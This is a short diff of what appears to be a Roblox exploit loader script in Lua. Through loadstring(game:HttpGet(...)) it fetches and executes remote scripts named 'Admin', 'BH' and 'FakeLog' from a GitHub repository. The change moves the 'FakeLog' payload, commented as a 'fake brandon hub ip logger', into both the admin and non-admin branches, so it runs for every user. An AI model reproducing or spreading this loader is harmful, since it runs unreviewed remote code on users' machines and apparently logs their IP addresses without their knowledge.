@@ -14,11 +14,12 @@ end
 
 if isAdmin(executor) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BH"))()
+    task.wait(1)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/Admin"))()
     task.wait(1)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BH"))()
+    task.wait(1)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
 end
-
--- fake brandon hub ip logger
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/FakeLog"))()
